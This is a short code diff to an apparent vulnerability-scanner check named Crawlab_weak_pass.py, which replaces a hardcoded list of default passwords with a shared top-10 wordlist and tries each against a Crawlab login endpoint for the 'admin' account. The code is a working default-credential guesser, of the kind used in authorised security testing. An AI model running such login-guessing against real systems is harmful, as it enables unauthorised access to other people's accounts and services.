@@ -2,7 +2,6 @@
 # -*- encoding: utf-8 -*-
 '''
 @File    :   Crawlab_weak_pass.py
-@Contact :   lihanwei@zhiqiansec.com
 @DateTime :  2023/9/10 16:00
 
 @Dork
@@ -24,15 +23,12 @@ POST /api/login
 '''
 
 from lib.utils.http import request_ex, get_http_url, urljoin_ex
+from lib.utils.dic import Wordlist
 
 
 def poc(url):
     url = urljoin_ex(url, "/api/login")
-    for pwd in [
-        "admin",
-        "123456",
-        "admin123"
-    ]:
+    for pwd in Wordlist.top_10_pass:
         resp = request_ex("post", url, json={"username": "admin", "password": pwd})
         if resp and resp.status_code != 401:
             return True
